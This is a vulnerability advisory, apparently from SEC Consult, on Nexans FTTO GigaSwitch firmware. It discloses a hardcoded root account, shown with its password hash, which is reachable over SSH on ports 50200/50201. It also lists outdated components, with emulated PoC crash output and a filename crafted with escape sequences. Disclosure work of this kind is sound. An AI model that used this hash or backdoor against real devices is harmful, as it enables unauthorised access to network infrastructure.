@@ -1,0 +1,269 @@
+id: 37806
+date: 06/21/2022
+title: Nexans FTTO GigaSwitch Outdated Components / Hardcoded Backdoor Vulnerability
+author: Tim Weber
+cves: CVE-2015-0235, CVE-2015-7547, CVE-2015-9261, CVE-2017-16544, CVE-2022-32985
+
+=======================================================================
+               title: Hardcoded Backdoor User and Outdated Software Components
+             product: Nexans FTTO GigaSwitch industrial/office switches HW version 5
+  vulnerable version: See "Vulnerable / tested versions"
+       fixed version: V6.02N, V7.02
+          CVE number: CVE-2022-32985
+              impact: High
+            homepage: https://www.nexans.com/
+               found: 2020-05-25
+                  by: T. Weber (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"As a global player in the cable industry, Nexans is behind the scenes
+delivering the innovative services and resilient products that carry thousands
+of watts of energy and terabytes of data per second around the world. Millions
+of homes, cities, businesses are powered every day by Nexans’ high-quality
+sustainable cabling solutions. We help our customers meet the challenges they
+face in the fields of energy infrastructure, energy resources, transport,
+buildings, telecom and data, providing them with solutions and services for the
+most complex cable applications in the most demanding environments."
+
+Source: https://www.nexans.com/company/What-we-do.html
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+SEC Consult recommends to perform a thorough security review of these
+products conducted by security professionals to identify and resolve all
+security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Outdated Vulnerable Software Components
+A static scan with the IoT Inspector (ONEKEY) revealed outdated software packages that
+are used in the devices' firmware. Four of them were verified by using the
+MEDUSA scalable firmware runtime.
+
+
+2) Hardcoded Backdoor User (CVE-2022-32985)
+A hardcoded root user was found in "/etc/passwd". In combination with the
+invoked dropbear SSH daemon in the libnx_apl.so library, it can be used on port
+50201 and 50200 to login on a system shell.
+
+
+Proof of concept:
+-----------------
+1) Outdated Vulnerable Software Components
+Based on an automated scan with the IoT Inspector (ONEKEY) the following third party
+software packages were found to be outdated:
+
+Firmware version 6.02L:
+BusyBox       1.20.2
+Dropbear SSH  2012.55
+GNU glibc     2.17
+lighttpd      1.4.48
+OpenSSL       1.0.2h
+
+The following CVEs were verified with MEDUSA scalable firmware emulation:
+
+* CVE-2015-9261 (Unzip)
+The crafted ZIP archive "x_6170921383890712452.bin" was taken from:
+https://www.openwall.com/lists/oss-security/2015/10/25/3
+Execution inside the firmware emulation:
+
+bash-4.2# unzip x_6170921383890712452.bin
+Archive:  x_6170921383890712452.bin
+   inflating: ]3j½r«IK-%Ix
+do_page_fault(): sending SIGSEGV to unzip for invalid read access from 735ededc
+epc = 0044bb28 in busybox[400000+99000]
+ra  = 0044b968 in busybox[400000+99000]
+Segmentation fault
+
+
+* CVE-2015-0235 (gethostbyname "GHOST" buffer overflow)
+
+PoC code was taken from:
+https://gist.github.com/dweinstein/66e6a088191ac0e8105c
+
+
+* CVE-2015-7547 (getaddrinfo buffer overflow)
+
+PoC code was taken from:
+https://github.com/fjserna/CVE-2015-7547
+
+-bash-4.4# python /medusa_exploits/cve-2015-7547-poc.py &
+[1] 259
+-bash-4.4# chroot /medusa_rootfs/ bin/bash
+bash-4.2# cd /medusa_exploits/
+bash-4.2# ./cve-2015-7547_glibc_getaddrinfo
+[UDP] Total Data len recv 36
+[UDP] Total Data len recv 36
+Connected with 127.0.0.1:34356
+[TCP] Total Data len recv 76
+[TCP] Request1 len recv 36
+[TCP] Request2 len recv 36
+Segmentation fault
+
+
+* CVE-2017-16544 (shell autocompletion vulnerability)
+
+A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
+vulnerability.
+-------------------------------------------------------------------------------
+# ls "pressing <TAB>"
+test
+]55;test.txt
+#
+-------------------------------------------------------------------------------
+
+
+2) Hardcoded Backdoor User (CVE-2022-32985)
+The hardcoded system user, reachable via the dropbear SSH daemon was found due
+to multiple indications on the system. The undocumented root user itself was
+contained in the "passwd" file:
+
+Content of the file "/etc/passwd".
+-------------------------------------------------------------------------------
+root:oFQzvQf5qrI56:0:0:root:/home/root:/bin/sh
+[...]
+-------------------------------------------------------------------------------
+
+A suspicious port for the SSH daemon was chosen in the config file of dropbear:
+
+Content of the file "/etc/init.d/dropbear":
+-------------------------------------------------------------------------------
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+DAEMON=/usr/sbin/dropbear
+NAME=dropbear
+DESC="Dropbear SSH server"
+PIDFILE=/var/run/dropbear.pid
+
+DROPBEAR_PORT="50200 -p 50201"
+[...]
+-------------------------------------------------------------------------------
+
+This is invoked from "/usr/lib/libnx_apl.so.0.0.0", which can be seen in the
+following pseudo-code:
+-------------------------------------------------------------------------------
+void dropbear_server_init(char param_1)
+
+{
+   __pid_t __pid;
+   char *pcVar1;
+   int aiStack16 [2];
+
+   __pid = fork();
+   if (__pid == 0) {
+     __pid = fork();
+     if (__pid != 0) {
+                     /* WARNING: Subroutine does not return */
+       exit(0);
+     }
+     if (param_1 == '\0') {
+       pcVar1 = "/etc/init.d/dropbear stop";
+     }
+     else {
+       pcVar1 = "/etc/init.d/dropbear start";                               <---
+     }
+     execl("/bin/sh","sh",&DAT_2cd91564,pcVar1,0);
+   }
+   else {
+     waitpid(__pid,aiStack16,0);
+   }
+   return;
+}
+-------------------------------------------------------------------------------
+
+
+This function is called if a specific command is issued in the CLI interface:
+-------------------------------------------------------------------------------
+[...]
+   iVar6 = telnet_cmp_command((char *)(param_3 + 0xf2),"ssh",2);
+   if (iVar6 != 0) {
+     if (param_2 < 4) {
+       netbuf_fwd_sprintf(param_1,"\r\n%%Error: Parameter missing\r\n");
+       iVar6 = shared_mem_get_addr(&var_shm);
+       iVar7 = shared_mem_get_addr(&var_shm);
+       uVar8 = shared_mem_read_u8(&var_shm,iVar7 + 0x161a);
+       shared_mem_write_u8(&var_shm,iVar6 + 0x161a,uVar8 & 0xff | 0x10);
+       return;
+     }
+     iVar6 = telnet_cmp_command((char *)(param_3 + 0x16b),"start",1);
+     if (iVar6 != 0) {
+       dropbear_server_init('\x01');                                        <---
+       netbuf_fwd_sprintf(param_1,"Starting dropbear...\r\n");
+       return;
+     }
+     iVar6 = telnet_cmp_command((char *)(param_3 + 0x16b),"stop",1);
+     if (iVar6 != 0) {
+       dropbear_server_init('\0');                                          <---
+       netbuf_fwd_sprintf(param_1,"Stopping dropbear...\r\n");
+       return;
+     }
+     netbuf_fwd_sprintf(param_1,"Uknown dropbear command...\r\n");
+     return;
+[...]
+-------------------------------------------------------------------------------
+The mentioned library is used in the CLI program that is running on the device.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following firmware versions have been tested:
+
+* Nexans FTTO GigaSwitch HW Version 5 (all industrial/office switches) / Firmware 6.02L
+* Nexans FTTO GigaSwitch HW Version 5 (all industrial/office switches) / Firmware 5.04M
+
+
+Vendor contact timeline:
+------------------------
+2020-05-28: Contacting the vendor's PSIRT under the following link:
+             http://www.nexans-ans.de/support/index.php?u=security_portal_sendmail
+      No answer.
+2020-06-08: Contacting vendor again via support.ans@nexans.com. Extended
+             deadline by 11 days.
+2020-06-16: Telephone call with Nexans representative. Security advisory was
+             received. It will be reviewed to confirm the found issues.
+2020-06-26: Telephone call with Nexans representative. Nexans is working on the
+             reported issues and will remove the dropbear daemon as first
+             measure.
+2020-08-04: Vendor stated that a fix for the outdated software components will
+             be available in November.
+2020-11-12: Asked for status update.
+2020-11-16: Contact stated, that firmware test will need more time. Updates are
+             estimated to be ready in Q1 of 2020.
+2020-11-20: Vendor confirmed Q1 as estimated disclosure date.
+2021-01-21: Asked for status update; Vendor stated that the release with all
+             fixes is aimed to be published end of Q1.
+2021-03-09: Asked for status update.
+2021-03-17: Vendor stated that the firmware is in testing stage. The fixed
+             firmware will be released in May.
+2021-06-10: Asked for status update.
+2021-06-14: Vendor stated that the firmware is not ready due to COVID19 and
+             homeschooling. The fixed firmware will be released end of August.
+2021-08-31: Asked for status update.
+2021-09-07: Vendor stated that the fixed firmware will be ready end of 2021.
+2022-05-23: Informed vendor that the advisory will be released mid of June 2022.
+2022-05-24: Firmware V7.02 is available for download which fixes most outdated
+             components issues.
+2022-06-15: Release of security advisory.
+
+
+Solution:
+---------
+The vendor provides an updated firmware here:
+https://www.nexans-ans.de/support/firmware/
+
+Firmware version V6.02N has the backdoor removed and was already published a while ago.
+Version V7.02 also has the backdoor removed and most of the outdated software issues.
+
+#  0day.today [2023-03-25]  #
